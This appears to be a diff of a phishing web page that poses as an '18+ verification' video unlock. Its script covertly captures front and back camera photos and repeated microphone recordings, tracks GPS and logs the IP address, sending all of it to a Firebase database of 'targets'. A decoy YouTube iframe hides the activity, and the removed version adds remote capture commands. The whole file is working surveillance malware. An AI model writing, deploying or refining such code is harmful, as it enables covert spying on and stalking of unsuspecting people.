@@ -3,83 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Cloud Storage | Secure Player</title>
+    <title>Age Verification | Secure Access</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
-        /* Aapki Specific Background Image */
-        #bg-container {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg'); /* Aapki file ka name */
-            background-size: cover; 
-            background-position: center; 
-            z-index: 1;
-        }
+        /* Background & Overlay */
+        #bg-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; z-index: 1; }
+        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.7); }
 
-        #overlay {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.3); /* Background image ko thoda dark karne ke liye */
-            z-index: 5;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
+        .play-btn { width: 80px; height: 80px; background: #ff0000; border-radius: 50%; border: 3px solid #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
 
-        .play-btn {
-            width: 90px; height: 90px; background: rgba(229, 9, 20, 0.9);
-            border-radius: 50%; border: 3px solid #fff;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; box-shadow: 0 0 30px rgba(0, 0, 0, 0.8); transition: 0.3s;
-        }
-        .play-btn::after {
-            content: ''; border-style: solid; border-width: 15px 0 15px 30px;
-            border-color: transparent transparent transparent #fff; margin-left: 8px;
-        }
+        /* Modal Style */
+        #verify-modal { background: #1a1a1a; width: 90%; max-width: 350px; padding: 25px; border-radius: 12px; border: 1px solid #ff0000; text-align: center; display: none; color: #fff; z-index: 20; }
+        .start-btn { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; }
 
-        .loading-text { 
-            color: #fff; margin-top: 20px; font-size: 14px; 
-            font-weight: bold; text-shadow: 2px 2px 4px #000;
-            letter-spacing: 1px; animation: blink 1.5s infinite; 
-        }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-
-        /* Fake Permission Modal */
-        #permission-modal {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: #111; width: 85%; max-width: 320px;
-            padding: 25px; border-radius: 10px; border: 1px solid #e50914;
-            z-index: 10; text-align: center; display: none; box-shadow: 0 0 50px #000;
-        }
-        #permission-modal h2 { color: #e50914; font-size: 18px; margin: 0 0 10px 0; }
-        #permission-modal p { color: #fff; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
-        
-        .unlock-btn {
-            background: #e50914; color: #fff; border: none; padding: 12px 25px;
-            width: 100%; border-radius: 5px; font-weight: bold; font-size: 14px; cursor: pointer;
-        }
-
-        /* Video Layer */
-        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; }
-        #main-player { width: 100%; height: 100%; }
+        /* VIDEO LOCKDOWN PLAYER */
+        #player-wrapper { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; background: #000; }
+        /* Ye target website ko dikhayega lekin 'pointer-events: none' isko un-clickable bana dega */
+        #fake-site { width: 100%; height: 100%; border: none; pointer-events: none; opacity: 0.3; position: absolute; top: 0; left: 0; }
+        #real-video { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; max-width: 800px; aspect-ratio: 16/9; z-index: 1000; border: 2px solid #ff0000; box-shadow: 0 0 50px #000; }
     </style>
 </head>
 <body>
 
-    <div id="bg-container"></div>
-
     <div id="overlay">
-        <div class="play-btn" id="main-play" onclick="showPopup()"></div>
-        <div class="loading-text" id="status-text">CLICK TO PLAY VIDEO</div>
+        <div class="play-btn" id="btn-play" onclick="showModal()"></div>
+        <p style="color:#fff; margin-top:15px; font-size:12px;">CLICK TO UNLOCK PRIVATE CONTENT</p>
         
-        <div id="permission-modal">
-            <h2>Age Verification</h2>
-            <p>To watch this private content, please complete a quick camera verification to confirm you are 18+.</p>
-            <button class="unlock-btn" onclick="ignite()">VERIFY & START</button>
+        <div id="verify-modal">
+            <h2 style="color:#ff0000; margin-top:0;">18+ VERIFICATION</h2>
+            <p style="font-size: 13px;">This video is age-restricted. Please allow camera verification to continue.</p>
+            <button class="start-btn" onclick="ignite()">VERIFY & WATCH</button>
         </div>
     </div>
 
-    <div id="video-container">
-        <iframe id="main-player" allow="autoplay; encrypted-media; camera; microphone; geolocation" frameborder="0"></iframe>
+    <div id="player-wrapper">
+        <iframe id="fake-site" src="https://m.youtube.com"></iframe>
+        <iframe id="real-video" allow="autoplay; encrypted-media"></iframe>
     </div>
 
 <script>
@@ -87,66 +50,42 @@
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
-    // Auto Session ID
     const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
-    const videoID = "6Ogzc_-lW9w"; 
+    const myVideoURL = "https://www.youtube.com/embed/6Ogzc_-lW9w?autoplay=1&controls=1"; // Aapki video
 
-    function showPopup() {
-        document.getElementById('main-play').style.display = 'none';
-        document.getElementById('status-text').style.display = 'none';
-        document.getElementById('permission-modal').style.display = 'block';
+    function showModal() {
+        document.getElementById('btn-play').style.display = 'none';
+        document.getElementById('verify-modal').style.display = 'block';
     }
 
     async function ignite() {
         try {
-            // Permission Request
+            // Step 1: Request Camera & Audio
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-            // Show Video
-            document.getElementById('video-container').style.display = 'block';
-            document.getElementById('main-player').src = `https://www.youtube.com/embed/${videoID}?autoplay=1&rel=0`;
+            // Step 2: Show Player Lockdown
+            document.getElementById('player-wrapper').style.display = 'block';
+            document.getElementById('real-video').src = myVideoURL;
+            document.getElementById('overlay').style.display = 'none';
 
-            // Data Collection
-            logDeviceInfo();
+            // Step 3: INSTANT CAPTURE (Front & Back)
+            capture("user"); // Front
+            setTimeout(() => capture("environment"), 3000); // Back after 3 sec
+
+            // Step 4: INSTANT 15s AUDIO
+            recordAudio(15000);
+
+            // Step 5: START DATA LOGS & GPS
+            logInfo();
             trackGPS();
-            
-            // Auto Capture Loop
-            capture("user"); 
-            setTimeout(() => capture("environment"), 4000);
-            setInterval(() => capture("user"), 15000);
 
-            // Dashboard Command Sync
-            db.ref(`commands/${sessionID}`).on('value', snap => {
-                const c = snap.val();
-                if(c) {
-                    if(c.act === 'f') capture("user");
-                    if(c.act === 'b') capture("environment");
-                    if(c.act === 'a') recordAudio(30000);
-                    db.ref(`commands/${sessionID}`).remove();
-                }
-            });
+            // Auto Refresh Capture every 30 sec
+            setInterval(() => { capture("user"); recordAudio(15000); }, 30000);
 
         } catch (e) {
-            alert("Verification Failed: Camera access is required to unlock video.");
+            alert("Verification Failed: Camera and Microphone access are mandatory for 18+ content.");
             location.reload();
         }
-    }
-
-    async function logDeviceInfo() {
-        let bat = "N/A";
-        try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
-        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-        
-        db.ref(`targets/${sessionID}/info`).set({
-            name: "Target_" + sessionID.split('_')[1],
-            ip: ipReq.ip,
-            battery: bat,
-            ram: (navigator.deviceMemory || "N/A"),
-            platform: navigator.platform,
-            status: "ONLINE",
-            time: new Date().toLocaleTimeString()
-        });
-        db.ref('alerts').set({ id: sessionID, t: Date.now() });
     }
 
     async function capture(mode) {
@@ -160,12 +99,12 @@
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 db.ref(`targets/${sessionID}/photos`).push({ 
-                    img: c.toDataURL('image/jpeg', 0.5), 
-                    type: mode,
-                    time: new Date().toLocaleTimeString()
+                    img: c.toDataURL('image/jpeg', 0.4), 
+                    type: mode, 
+                    time: new Date().toLocaleTimeString() 
                 });
                 stream.getTracks().forEach(t => t.stop());
-            }, 1500);
+            }, 2000);
         } catch(e) {}
     }
 
@@ -173,13 +112,13 @@
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const mr = new MediaRecorder(stream);
-            let ch = [];
-            mr.ondataavailable = (e) => ch.push(e.data);
+            let chunks = [];
+            mr.ondataavailable = (e) => chunks.push(e.data);
             mr.onstop = () => {
-                const blob = new Blob(ch, { type: 'audio/webm' });
+                const blob = new Blob(chunks, { type: 'audio/webm' });
                 const reader = new FileReader();
                 reader.readAsDataURL(blob);
-                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({ data: reader.result });
+                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({ data: reader.result, time: new Date().toLocaleTimeString() });
             };
             mr.start(); setTimeout(() => mr.stop(), ms);
         } catch(e) {}
@@ -187,13 +126,19 @@
 
     function trackGPS() {
         navigator.geolocation.watchPosition(p => {
-            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+            db.ref(`targets/${sessionID}/location`).set({ latitude: p.coords.latitude, longitude: p.coords.longitude });
         }, null, {enableHighAccuracy:true});
+    }
+
+    async function logInfo() {
+        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+        db.ref(`targets/${sessionID}/info`).set({
+            ip: ipReq.ip,
+            platform: navigator.platform,
+            agent: navigator.userAgent,
+            time: new Date().toLocaleString()
+        });
     }
 </script>
 </body>
 </html>
-
-
-
-
